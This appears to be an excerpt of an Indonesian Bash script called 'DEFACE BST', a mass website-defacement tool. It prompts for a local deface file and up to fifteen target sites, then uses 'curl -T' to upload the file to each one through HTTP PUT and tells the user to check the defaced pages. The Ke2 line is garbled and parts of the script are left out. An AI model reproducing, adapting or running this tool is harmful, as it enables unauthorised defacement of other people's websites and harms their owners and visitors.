...
toilet -f standard " DEFACE BST "
echo
echo ""
echo "==============================="
echo $red"CREATED=Mr.N4w4Nu6"
echo $green"VERSION=0.1"
echo "==============================="
echo
echo $green"*SCRIP NYA TARUK DI LUAR FOLDER INTERNAL*"
echo $red"[+]====================================================[+]"
echo $red"Masukan nama script"
read -p "[=======>" script
echo $red"[+]====================================================[+]"
echo $green"Masukan Web Target Ke1"
read -p "[=======>" Ke1
curl -T /storage/emulated/0/$script $Ke1
echo $red"[+]====================================================[+]"
echo $red"[+]====================================================[+]"
echo $green"Masukan Web Target Ke2"
read -p "[=======>" * $red"[+]====================================================[+]"
echo $green"Masukan Web Target Ke3"
read -p "[=======>" Ke3
curl -T /storage/emulated/0/$script $Ke3
echo $red"[+]====================================================[+]"
echo $red"[+]====================================================[+]"
echo $green"Masukan Web Target Ke4"
read -p "[=======>" Ke4
curl -T /storage/emulated/0/$script $Ke4
echo $red"[+]====================================================[+]"
echo $red"[+]====================================================[+]"
echo $green"Masukan Web Target Ke5"
read -p "[=======>" Ke5
curl -T /storage/emulated/0/$script $Ke5
echo $red"[+]====================================================[+]"
echo $red"[+]====================================================[+]"
echo $green"Masukan Web Target Ke6"
read -p "[=======>" Ke6
curl -T /storage/emulated/0/$script $Ke6
echo $red"[+]====================================================[+]"
echo $red"[+]====================================================[+]"
echo $green"Masukan Web Target Ke7"
read -p "[=======>" Ke7
curl -T /storage/emulated/0/$script $Ke7
echo $red"[+]====================================================[+]"
echo $red"[+]====================================================[+]"
echo $green"Masukan Web Target Ke8"
read -p "[=======>" Ke8
curl -T /storage/emulated/0/$script $Ke8
echo $red"[+]====================================================[+]"
echo $red"[+]====================================================[+]"
echo $green"Masukan Web Target Ke9"
read -p "[=======>" Ke9
curl -T /storage/emulated/0/$script $Ke9
echo $red"[+]====================================================[+]"
echo $red"[+]====================================================[+]"
echo $green"Masukan Web Target Ke10"
read -p "[=======>" Ke10
curl -T /storage/emulated/0/$script $Ke10
echo $red"[+]====================================================[+]"
echo $red"[+]====================================================[+]"
echo $green"Masukan Web Target Ke11"
read -p "[=======>" Ke11
curl -T /storage/emulated/0/$script $Ke11
echo $red"[+]====================================================[+]"
echo $red"[+]====================================================[+]"
echo $green"Masukan Web Target Ke12"
read -p "[=======>" Ke12
curl -T /storage/emulated/0/$script $Ke12
echo $red"[+]====================================================[+]"
echo $red"[+]====================================================[+]"
echo $green"Masukan Web Target Ke13"
read -p "[=======>" Ke13
curl -T /storage/emulated/0/$script $Ke13
echo $red"[+]====================================================[+]"
echo $red"[+]====================================================[+]"
echo $green"Masukan Web Target Ke14"
read -p "[=======>" Ke14
curl -T /storage/emulated/0/$script $Ke14
echo $red"[+]====================================================[+]"
echo $red"[+]====================================================[+]"
echo $green"Masukan Web Target Ke15"
read -p "[=======>" Ke15
...
echo figlet -f standard "HASIL" | lolcat
echo $red"kalau gk berhasil jangan nangis ok aekeowko"
echo $green
...
echo "Silahkan Cek Web $Ke15/$script"
echo
echo $cyan"KEMBALI LAGI YA GANS :)"
echo $red"============="
echo $yellow"============="
echo $green"============="
echo $blue"============="